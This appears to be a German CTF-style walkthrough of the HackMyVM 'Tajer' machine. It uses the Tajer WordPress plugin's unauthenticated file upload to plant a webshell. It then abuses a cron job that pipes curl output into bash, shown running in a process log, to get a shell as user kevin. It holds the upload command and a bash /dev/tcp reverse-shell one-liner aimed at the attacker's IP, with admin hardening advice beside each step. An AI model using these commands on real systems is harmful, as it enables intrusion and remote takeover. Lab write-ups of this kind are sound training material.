@@ -1,0 +1,374 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tajer - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <h1>Tajer - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">curl</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc (netcat)</div>
+                <!-- Füge hier ggf. weitere Tools hinzu -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (POC)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="evaluation">
+                **Bewertung:** Im vorliegenden Berichtsauszug fehlen die initialen Reconnaissance-Schritte wie Portscans (Nmap) oder Directory Brute-Forcing. Diese sind normalerweise entscheidend, um offene Dienste, Webserver-Technologien und potenzielle Angriffsvektoren zu identifizieren. Es wird direkt mit der Ausnutzung einer bekannten Schwachstelle begonnen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Immer mit umfassender Reconnaissance starten (Nmap, Gobuster/Feroxbuster, Nikto etc.), um ein vollständiges Bild des Ziels zu erhalten, auch wenn eine offensichtliche Schwachstelle bekannt ist. Dies kann zusätzliche, unerwartete Angriffswege aufdecken.<br>
+                **Empfehlung (Admin):** Regelmäßige externe und interne Scans durchführen, um die eigene Angriffsfläche zu kennen und unnötige Dienste oder offene Ports zu identifizieren und zu schließen. Firewall-Regeln überprüfen und restriktiv gestalten.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="evaluation">
+                **Bewertung:** Ähnlich wie bei der Reconnaissance fehlt eine detaillierte Web Enumeration. Der Bericht impliziert, dass WordPress und das spezifische "tajer"-Plugin bereits als Ziel identifiziert wurden. Normalerweise würde man hier nach Verzeichnissen, Dateien, Subdomains, eingesetzten Technologien (CMS, Frameworks, Versionen) und spezifischen Schwachstellen in diesen Komponenten suchen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Tools wie `wpscan` (für WordPress), `nikto`, `gobuster`, `feroxbuster` oder Burp Suite einsetzen, um die Webanwendung systematisch zu analysieren, Verzeichnisse zu finden, Plugins/Themes zu identifizieren und nach bekannten Schwachstellen zu suchen.<br>
+                **Empfehlung (Admin):** Webserver und Anwendungen aktuell halten (Patches!). Unnötige Dateien oder Verzeichnisse entfernen. Sicherheits-Header implementieren. Regelmäßige Schwachstellenscans für Webanwendungen durchführen. Zugriff auf sensible Konfigurationsdateien oder Backup-Dateien beschränken.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept (POC): Ausnutzung der Tajer Plugin Schwachstelle</h2>
+            <p class="analysis">
+                **Analyse:** Der Bericht startet mit der Beschreibung einer spezifischen Schwachstelle im WordPress-Plugin "tajer". Es handelt sich um eine "Unauthenticated Arbitrary File Upload"-Schwachstelle. Das bedeutet, dass ein Angreifer ohne vorherige Anmeldung (unauthenticated) beliebige Dateien (arbitrary file upload) auf den Server hochladen kann. Der bereitgestellte Link verweist auf eine externe Datenbank (wpscan.com), die diese Schwachstelle dokumentiert: [Link: wpscan.com/vulnerability/655bc140-5bbf-4a7e-b20d-4343a75c0c67/ | Ziel: https://wpscan.com/vulnerability/655bc140-5bbf-4a7e-b20d-4343a75c0c67/].
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Diese Art von Schwachstelle ist äußerst kritisch. Das Hochladen einer beliebigen Datei, insbesondere einer Webshell (wie hier mit `shell.php`), ermöglicht es dem Angreifer in der Regel, Code auf dem Server im Kontext des Webserver-Benutzers (oft `www-data` oder `apache`) auszuführen. Dies führt zu einem initialen Zugriff auf das System. Die Schwachstelle scheint eine Komponente (jQuery-File-Upload) zu betreffen, die innerhalb des Tajer-Plugins verwendet wird.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Bei Fund einer solchen Schwachstelle ist das Ziel, eine Webshell hochzuladen, um Remote Code Execution (RCE) zu erlangen. Es sollte geprüft werden, ob Dateiendungen oder Inhaltstypen gefiltert werden. Manchmal müssen Tricks angewendet werden (z.B. Doppelte Endungen, Magic Bytes ändern), um Filter zu umgehen.<br>
+                **Empfehlung (Admin):** Das betroffene Plugin "tajer" muss sofort deaktiviert und deinstalliert oder auf eine gepatchte Version aktualisiert werden (falls verfügbar). Generell sollten Dateiupload-Funktionen streng validiert werden: Nur erlaubte Dateitypen zulassen, Dateinamen bereinigen, Upload-Verzeichnisse außerhalb des Web-Roots platzieren (wenn möglich) und sicherstellen, dass hochgeladene Dateien nicht direkt ausführbar sind (z.B. durch `.htaccess`-Regeln oder Webserver-Konfiguration). Regelmäßige Plugin-/Theme-Updates sind essenziell.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Korrigierter Prompt: Ohne führende Leerzeichen -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -F "files=@shell.php" http://tajer.wordpress.hmv/wp-content/plugins/tajer/lib/jQuery-File-Upload-master/server/php/index.php</span></div>
+                    <pre>
+{"files":[{"name":"shell.php","size":5495,"type":"application\/octet-stream","url":"http:\/\/tajer.wordpress.hmv\/wp-content\/plugins\/tajer\/lib\/jQuery-File-Upload-master\/server\/php\/files\/shell.php","deleteUrl":"http:\/\/tajer.wordpress.hmv\/wp-content\/plugins\/tajer\/lib\/jQuery-File-Upload-master\/server\/php\/?file=shell.php","deleteType":"DELETE"}]}
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der `curl`-Befehl wird verwendet, um die Schwachstelle auszunutzen.
+                *   `curl`: Ein Kommandozeilen-Tool zum Übertragen von Daten mit URLs.
+                *   `-F "files=@shell.php"`: Sendet einen HTTP-POST-Request mit Formulardaten (`-F`). Der Parameter `files` wird mit dem Inhalt der lokalen Datei `shell.php` belegt (das `@`-Zeichen signalisiert den Dateiupload).
+                *   `http://tajer.wordpress.hmv/.../index.php`: Die Ziel-URL, an die der Request gesendet wird. Dies ist der Endpunkt des verwundbaren Upload-Skripts innerhalb des Tajer-Plugins.
+                Die Ausgabe ist eine JSON-Antwort vom Server. Sie bestätigt den erfolgreichen Upload der Datei `shell.php` (Größe 5495 Bytes) und gibt die URL (`url`) zurück, unter der die hochgeladene Datei nun erreichbar ist: `http://tajer.wordpress.hmv/wp-content/plugins/tajer/lib/jQuery-File-Upload-master/server/php/files/shell.php`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Upload war erfolgreich. Dies ist der entscheidende Schritt zur Kompromittierung. Die JSON-Antwort liefert uns direkt den Pfad zur Webshell. Ein Angreifer kann diese URL nun im Browser aufrufen oder mit Tools wie `curl` interagieren, um Befehle auf dem Zielsystem auszuführen. Der initiale Zugriffspunkt ist damit geschaffen. Die Existenz einer `deleteUrl` ist ebenfalls interessant, aber für den Angreifer weniger relevant als die `url` zur Ausführung.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Die zurückgegebene URL sofort testen, um die Funktionsfähigkeit der Webshell zu bestätigen. Eine stabile Reverse Shell sollte als nächstes etabliert werden, da Webshells oft unzuverlässig sind oder durch Firewalls/Logging auffallen. Die Webshell selbst sollte möglichst unauffällig sein.<br>
+                **Empfehlung (Admin):** Wie bereits erwähnt, das Plugin patchen/entfernen. Zusätzlich sollten Web Application Firewalls (WAFs) eingesetzt werden, die solche Upload-Versuche erkennen und blockieren können. Server-seitiges Monitoring sollte verdächtige Dateioperationen (Schreiben in Web-Verzeichnisse) oder Prozessstarts durch den Webserver-Benutzer erkennen. Dateiberechtigungen im Web-Verzeichnis sollten so restriktiv wie möglich sein.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="analysis">
+                **Analyse:** Die folgenden Zeilen scheinen aus einem Prozess-Monitoring-Tool wie `pspy` oder einem ähnlichen Tool zu stammen, das auf dem Zielsystem läuft (möglicherweise über die zuvor hochgeladene Webshell gestartet, obwohl dieser Schritt nicht gezeigt wird). Es protokolliert Befehle, die am `2024/04/14` um ca. `17:18:01` ausgeführt wurden.
+                *   Zwei `CRON`-Prozesse werden gestartet (`UID=0`, also als root).
+                *   Mehrere (`PID=1651` bis `1654`) Befehle werden als Benutzer `UID=1001` (später als `kevin` identifiziert) ausgeführt. Diese Befehle bestehen aus einer komplexen Kette: `/bin/sh` startet `/usr/bin/bash`, welches wiederum eine Bash-Instanz startet, deren Standardeingabe (`<`) das Ergebnis eines `curl`-Befehls ist (`/usr/bin/curl -s http://password.wordpress.hmv/k3vin`). Das `-s` bei `curl` unterdrückt die Fortschrittsanzeige (silent).
+                Im Wesentlichen lädt der Benutzer `kevin` (UID 1001) regelmäßig ein Skript namens `k3vin` von einem internen Webserver (`http://password.wordpress.hmv`) herunter und führt es direkt mit Bash aus.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist ein sehr wichtiger Fund. Ein regelmäßig ausgeführter Cronjob (oder ein ähnlicher Mechanismus), der ein Skript von einer per HTTP erreichbaren Quelle herunterlädt und ausführt, ist ein potenzieller Vektor für Privilege Escalation oder Persistenz. Wenn wir den Inhalt der Datei `k3vin` kontrollieren können oder den Webserver `password.wordpress.hmv` kompromittieren können, können wir beliebigen Code als Benutzer `kevin` ausführen lassen. Die mehrfache Ausführung innerhalb derselben Sekunde ist ungewöhnlich und könnte auf eine Fehlkonfiguration oder eine Schleife hindeuten. Die Tatsache, dass dies als Benutzer `kevin` (UID 1001) und nicht als `www-data` (der Benutzer der Webshell) geschieht, deutet auf einen möglichen Weg zur horizontalen oder vertikalen Rechteausweitung hin.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  Den Host `password.wordpress.hmv` untersuchen. Ist er vom kompromittierten `www-data`-Kontext erreichbar?
+                2.  Versuchen, die Datei `k3vin` von `http://password.wordpress.hmv/k3vin` herunterzuladen und zu analysieren.
+                3.  Prüfen, ob der Webserver, der `password.wordpress.hmv` hostet, kompromittiert oder manipuliert werden kann, um eine eigene `k3vin`-Datei auszuliefern (z.B. eine Reverse Shell).
+                4.  Den Mechanismus verstehen, der diese Befehle auslöst (Cronjob, Systemd Timer, etc.).<br>
+                **Empfehlung (Admin):** Skripte sollten niemals auf diese Weise von einer HTTP-Quelle heruntergeladen und direkt ausgeführt werden. Dies ist extrem unsicher.
+                1.  Den verantwortlichen Cronjob/Timer identifizieren und entfernen oder sicher gestalten.
+                2.  Skripte sollten lokal gespeichert und Integritätsprüfungen unterzogen werden.
+                3.  Der Zugriff auf interne Webserver sollte authentifiziert und verschlüsselt (HTTPS) sein.
+                4.  Die Notwendigkeit dieses Mechanismus grundsätzlich hinterfragen. Prozess-Monitoring und Logging (wie hier gesehen) ist gut, sollte aber auch auf verdächtige Aktivitäten wie diese reagieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">2024/04/14 17:18:01 CMD: UID=0    PID=1650   | /usr/sbin/CRN -f</span>
+<span class="password">2024/04/14 17:18:01 CMD: UID=0    PID=1649   | /usr/sbin/CRN -f</span>
+<span class="password">2024/04/14 17:18:01 CMD: UID=1001 PID=1651   | /bin/sh -c /usr/bin/bash -c '/usr/bin/bash < <(/usr/bin/curl -s http://password.wordpress.hmv/k3vin)'</span>
+<span class="password">2024/04/14 17:18:01 CMD: UID=1001 PID=1653   | /usr/bin/bash -c /usr/bin/bash < <(/usr/bin/curl -s http://password.wordpress.hmv/k3vin)</span>
+<span class="password">2024/04/14 17:18:01 CMD: UID=1001 PID=1652   | /usr/bin/bash -c /usr/bin/bash < <(/usr/bin/curl -s http://password.wordpress.hmv/k3vin)</span>
+<span class="password">2024/04/14 17:18:01 CMD: UID=1001 PID=1654   | /usr/bin/bash -c /usr/bin/bash < <(/usr/bin/curl -s http://password.wordpress.hmv/k3vin)</span>
+                    </pre>
+                </div>
+            </div>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@tajer:/tmp$ <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+<span class="command">192.168.2.199  http://password.wordpress.hmv</span>            ^C
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester befindet sich nun offenbar in einer Shell als Benutzer `www-data` auf dem Zielsystem (`tajer`), wahrscheinlich über die zuvor hochgeladene Webshell. Der Befehl `cat /etc/hosts` wird ausgeführt, um den Inhalt der Hosts-Datei anzuzeigen. Diese Datei wird verwendet, um Hostnamen manuell IP-Adressen zuzuordnen, bevor DNS-Server abgefragt werden.
+                Die Ausgabe zeigt die Standard-Localhost-Einträge und einen interessanten Eintrag: `192.168.2.199 http://password.wordpress.hmv`. Das `^C` am Ende deutet darauf hin, dass die Ausgabe möglicherweise abgebrochen wurde oder ein Steuerzeichen im Editor sichtbar war. Wichtig ist, dass der Hostname `http://password.wordpress.hmv`, von dem das `k3vin`-Skript geladen wird, auf die IP-Adresse `192.168.2.199` zeigt.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Fund ist entscheidend. Die IP `192.168.2.199` ist wahrscheinlich die IP-Adresse des Angreifer-Rechners (Kali/Cyber). Das bedeutet, dass der Cronjob/Mechanismus, der `k3vin` herunterlädt, so konfiguriert ist, dass er das Skript vom *Angreifer-Rechner* bezieht, sobald dieser Eintrag in `/etc/hosts` vorhanden ist. Der Benutzer `www-data` scheint jedoch keine Schreibrechte auf `/etc/hosts` zu haben (was normal ist), wie die nachfolgenden Befehle zeigen werden.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Bestätigen, dass `192.168.2.199` die eigene IP ist. Da `www-data` `/etc/hosts` wahrscheinlich nicht direkt bearbeiten kann, nach Wegen suchen, wie dieser Eintrag geändert werden kann (z.B. durch eine andere Schwachstelle, Fehlkonfiguration oder einen Prozess, der dies erlaubt). Wenn der Eintrag nicht geändert werden kann, alternative Wege suchen, um den `curl`-Aufruf umzuleiten (z.B. ARP-Spoofing, falls im selben Netzwerksegment, oder Ausnutzung anderer Schwachstellen, um Schreibrechte auf `/etc/hosts` zu erlangen).<br>
+                **Empfehlung (Admin):** Die Datei `/etc/hosts` sollte nur von `root` beschreibbar sein. Es sollte überwacht werden, ob nicht privilegierte Benutzer versuchen, diese Datei zu ändern. Die Verwendung von Hostnamen in sicherheitskritischen Skripten, die durch `/etc/hosts` manipuliert werden können, sollte vermieden oder durch zusätzliche Prüfungen (z.B. Vergleich mit erwarteter IP, HTTPS-Zertifikatsprüfung) abgesichert werden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@tajer:/tmp$ <span class="command">echo '192.168.2.199  http://password.wordpress.hmv' >> /etc/hosts</span></div>
+                    <!-- Keine Ausgabe -->
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Der Pentester versucht, den Eintrag für `http://password.wordpress.hmv` explizit in die `/etc/hosts`-Datei zu schreiben, um sicherzustellen, dass Anfragen an diesen Hostnamen zur IP `192.168.2.199` (vermutlich die Angreifer-Maschine) geleitet werden. Der Befehl `echo '...' >> /etc/hosts` versucht, den String an die Datei anzuhängen.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Da keine Fehlermeldung wie "Permission denied" angezeigt wird, ist es wahrscheinlich, dass dieser Befehl fehlgeschlagen ist, weil der Benutzer `www-data` keine Schreibrechte für `/etc/hosts` hat. In vielen Shells wird bei fehlgeschlagenen Umleitungen keine explizite Fehlermeldung ausgegeben, wenn die Shell selbst nicht abbricht. Der Versuch, die Hosts-Datei als `www-data` zu manipulieren, war erwartungsgemäß erfolglos.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Überprüfen, ob der Eintrag tatsächlich hinzugefügt wurde (z.B. mit `cat /etc/hosts` oder `grep 'password.wordpress.hmv' /etc/hosts`). Da dies wahrscheinlich fehlschlug, alternative Methoden zur Umleitung des Traffics oder zur Eskalation der Rechte suchen, um Schreibzugriff auf `/etc/hosts` zu erhalten.<br>
+                **Empfehlung (Admin):** Sicherstellen, dass Dateiberechtigungen korrekt gesetzt sind (`/etc/hosts` sollte `root:root` gehören und typischerweise `644`-Berechtigungen haben). Logging von fehlgeschlagenen Schreibversuchen auf kritische Systemdateien kann bei der Erkennung von Angriffsversuchen helfen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tajer:/tmp$ <span class="command">stty rows 53 columns 238</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Befehl `stty rows 53 columns 238` wird verwendet, um die Terminal-Einstellungen für die aktuelle Shell-Sitzung anzupassen. `stty` steht für "set tty" (set terminal). Mit `rows 53` wird die Anzahl der Zeilen und mit `columns 238` die Anzahl der Spalten des Terminals festgelegt.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies ist ein typischer Schritt, um eine interaktivere und benutzerfreundlichere Shell zu erhalten, insbesondere wenn man über eine eingeschränkte Webshell oder eine einfache Reverse Shell (`nc`) verbunden ist. Standardmäßig haben solche Shells oft keine korrekten Terminal-Informationen, was zu Darstellungsproblemen bei Tools wie `vim`, `top` oder bei der Verwendung von Befehlszeilen-Vervollständigung führen kann. Der Pentester versucht hier, die Remote-Shell an die Größe seines lokalen Terminal-Fensters anzupassen ("Shell Upgrade").
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Dies ist eine gute Praxis für eine stabilere Shell. Oft wird dies kombiniert mit anderen Befehlen wie `python -c 'import pty; pty.spawn("/bin/bash")'` und dem Setzen der `TERM`-Umgebungsvariable (z.B. `export TERM=xterm`), um eine vollständig interaktive TTY zu erhalten.<br>
+                 **Empfehlung (Admin):** Aus Admin-Sicht ist dieser Befehl an sich harmlos. Er kann jedoch ein Indikator dafür sein, dass ein Angreifer versucht, eine stabilere Präsenz auf dem System zu etablieren. Im Kontext anderer verdächtiger Aktivitäten sollte dies beachtet werden.
+             </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@tajer:/tmp$ <span class="command">echo '192.168.2.199  password.wordpress.hmv' >> /etc/hosts</span></div>
+                     <!-- Keine Ausgabe -->
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Ein erneuter Versuch, die `/etc/hosts`-Datei zu bearbeiten. Diesmal wird der Hostname `password.wordpress.hmv` ohne das `http://`-Protokollpräfix verwendet. Dies ist das korrekte Format für einen Eintrag in `/etc/hosts`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Obwohl das Format jetzt korrekt ist, wird dieser Versuch ebenfalls fehlschlagen, da der Benutzer `www-data` immer noch keine Schreibrechte für `/etc/hosts` hat. Der Pentester erkennt möglicherweise den vorherigen Formatierungsfehler, aber nicht das grundlegende Berechtigungsproblem.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wie zuvor: Rechte überprüfen, alternative Methoden suchen. Den Fokus auf die Analyse des `k3vin`-Skripts und die Suche nach Wegen legen, dieses zu manipulieren oder den ausführenden Benutzer (`kevin`) zu kompromittieren.<br>
+                **Empfehlung (Admin):** Keine Änderung zur vorherigen Empfehlung bezüglich `/etc/hosts`.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Korrigierter Prompt: Ohne führende Leerzeichen -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi k3vin</span></div>
+                     <!-- Keine Ausgabe -->
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester wechselt zurück zu seiner lokalen Maschine (`root@cyber`). Der Befehl `vi k3vin` wird ausgeführt. `vi` ist ein textbasierter Editor. Damit wird eine lokale Datei namens `k3vin` erstellt oder bearbeitet.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist die Vorbereitung, um den Cronjob/Mechanismus auf dem Zielsystem auszunutzen. Der Pentester erstellt nun den Inhalt der Datei `k3vin`, die vom Zielsystem heruntergeladen und ausgeführt werden soll. Der Inhalt dieser Datei wird typischerweise eine Reverse Shell oder ein anderer Befehl sein, der dem Angreifer eine Shell als Benutzer `kevin` (UID 1001) verschafft.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** In die Datei `k3vin` einen zuverlässigen Reverse-Shell-Payload schreiben, z.B. mit Bash, Python, Perl oder Netcat. Sicherstellen, dass der Payload auf die IP-Adresse und den Port des eigenen Listeners (`nc -lvnp 4444`) zeigt. Beispiel (Bash): `bash -i >& /dev/tcp/192.168.2.199/4444 0>&1`.<br>
+                **Empfehlung (Admin):** Dies geschieht auf der Angreifer-Maschine und ist nicht direkt auf dem Zielsystem sichtbar. Die Verteidigung muss sich darauf konzentrieren, den Download und die Ausführung der `k3vin`-Datei zu verhindern (siehe vorherige Empfehlungen zum Cronjob).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Korrigierter Prompt: Ohne führende Leerzeichen -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 80</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Auf der lokalen Angreifer-Maschine wird ein einfacher HTTP-Server mit Python 3 gestartet.
+                *   `python3 -m http.server`: Startet das eingebaute HTTP-Server-Modul von Python 3.
+                *   `80`: Gibt an, dass der Server auf Port 80 lauschen soll.
+                Der Server wird auf allen verfügbaren Netzwerkschnittstellen (`0.0.0.0`) gestartet und dient Dateien aus dem aktuellen Verzeichnis (`~`, dem Home-Verzeichnis von root) aus.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dieser Schritt ist notwendig, damit das Zielsystem die zuvor erstellte Datei `k3vin` herunterladen kann. Da der `curl`-Befehl auf dem Zielsystem `http://password.wordpress.hmv/k3vin` anfordert und `/etc/hosts` (angenommen, der Eintrag konnte doch gesetzt werden oder war bereits vorhanden) `password.wordpress.hmv` auf die Angreifer-IP (`192.168.2.199`) auflöst, wird die Anfrage an diesen Python-HTTP-Server gehen. Der Server wird die Datei `k3vin` aus dem Home-Verzeichnis des Angreifers ausliefern. Port 80 wird verwendet, da dies der Standard-HTTP-Port ist und im `curl`-Befehl keine andere Portnummer angegeben wurde.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Sicherstellen, dass die Datei `k3vin` im richtigen Verzeichnis liegt (hier `~`, das Verzeichnis, aus dem der Python-Server gestartet wurde). Die Firewall auf der Angreifer-Maschine muss eingehende Verbindungen auf Port 80 zulassen. Nach erfolgreicher Verbindung und Ausführung der Reverse Shell kann der HTTP-Server wieder gestoppt werden.<br>
+                **Empfehlung (Admin):** Ausgehende Verbindungen vom Server ins Internet oder zu ungewöhnlichen internen IPs/Ports sollten durch Firewalls kontrolliert und beschränkt werden (Egress Filtering). Wenn der Server legitimerweise keine HTTP-Verbindungen zu beliebigen IPs aufbauen muss, sollte dies blockiert werden. Das Monitoring sollte ausgehende Verbindungsversuche zu verdächtigen Zielen protokollieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Korrigierter Prompt: Ohne führende Leerzeichen -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Auf der lokalen Angreifer-Maschine wird ein Netcat-Listener gestartet.
+                *   `nc`: Das Netcat-Tool, ein vielseitiges Netzwerkwerkzeug.
+                *   `-l`: Listen-Modus, wartet auf eingehende Verbindungen.
+                *   `-v`: Verbose-Modus, gibt mehr Informationen aus.
+                *   `-n`: Numerischer Modus, keine DNS-Auflösung.
+                *   `-p 4444`: Lauscht auf Port 4444.
+                Der Befehl wartet nun darauf, dass eine Verbindung auf Port 4444 eingeht.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Dies ist der Listener für die Reverse Shell, die in der Datei `k3vin` platziert wurde. Wenn das Zielsystem `k3vin` herunterlädt und ausführt, wird der darin enthaltene Payload versuchen, eine Verbindung zur Angreifer-Maschine (`192.168.2.199`) auf Port `4444` herzustellen. Netcat fängt diese Verbindung ab und gibt dem Angreifer eine Shell auf dem Zielsystem, die als der Benutzer läuft, der den `k3vin`-Payload ausgeführt hat (also `kevin`, UID 1001).
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Den Listener laufen lassen und warten, bis der Cronjob/Mechanismus auf dem Zielsystem das `k3vin`-Skript ausführt und die Verbindung herstellt. Sicherstellen, dass die Firewall eingehende Verbindungen auf Port 4444 erlaubt.<br>
+                **Empfehlung (Admin):** Auch hier gilt Egress Filtering: Ausgehende Verbindungen zu ungewöhnlichen Ports wie 4444 sollten blockiert werden, wenn sie nicht für legitime Zwecke benötigt werden. Intrusion Detection Systems (IDS) können Signaturen für bekannte Reverse-Shell-Verbindungen erkennen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Korrigierter Prompt: Ohne führende Leerzeichen -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNWN) [192.168.2.113] 52580</span>
+id
+<span class="command">uid=1001(kevin) gid=1001(kevin) groups=1001(kevin)</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Netcat-Listener zeigt eine eingehende Verbindung an.
+                 *   `connect to [192.168.2.199] from (UNKNWN) [192.168.2.113] 52580`: Eine Verbindung wurde vom Zielsystem mit der IP `192.168.2.113` (Port `52580`) zur Angreifer-Maschine (`192.168.2.199`, Port `4444`, auf dem `nc` lauscht) hergestellt.
+                 *   `id`: Der Angreifer führt sofort den `id`-Befehl in der erhaltenen Shell aus.
+                 *   `uid=1001(kevin) gid=1001(kevin) groups=1001(kevin)`: Die Ausgabe des `id`-Befehls bestätigt, dass die erhaltene Shell als Benutzer `kevin` (UID 1001) läuft.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Fantastisch! Der Plan hat funktioniert. Durch das Ausnutzen des unsicheren Cronjobs/Mechanismus, der das Skript `k3vin` vom Angreifer-kontrollierten HTTP-Server herunterlädt und ausführt, wurde erfolgreich eine Reverse Shell als Benutzer `kevin` erlangt. Dies stellt den erfolgreichen "Initial Access" als Benutzer `kevin` dar (obwohl der allererste Zugriff als `www-data` erfolgte, ist dies ein bedeutender Fortschritt). Der Angreifer hat nun eine interaktive Shell als ein Benutzer mit potenziell mehr Rechten oder Zugriff auf andere Ressourcen als `www-data`.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  Die Shell stabilisieren (TTY-Upgrade mit `python`, `stty`, `export TERM`).
+                 2.  Umfassende Enumeration als Benutzer `kevin` durchführen: Home-Verzeichnis prüfen, `sudo -l`, SUID/GUID-Dateien suchen, laufende Prozesse, Netzwerkverbindungen, installierte Software, Kernel-Version, mögliche Cronjobs von `kevin`.
+                 3.  Nach Wegen suchen, um die Rechte weiter zu `root` zu eskalieren (Privilege Escalation).<br>
+                 **Empfehlung (Admin):** Den kompromittierten Benutzeraccount (`kevin`) untersuchen (Login-Zeiten, ausgeführte Befehle). Den ausgenutzten Mechanismus (Cronjob/Timer) sofort deaktivieren und bereinigen. Das System auf weitere Persistenzmechanismen oder Backdoors untersuchen, die der Angreifer möglicherweise hinterlassen hat. Passwörter für betroffene und potenziell verwandte Accounts ändern. Überlegen, wie der Angreifer an die Information über den Cronjob und den Hostnamen `password.wordpress.hmv` gekommen ist (möglicherweise durch vorherige Enumeration als `www-data`).
+             </p>
+
+        </section>
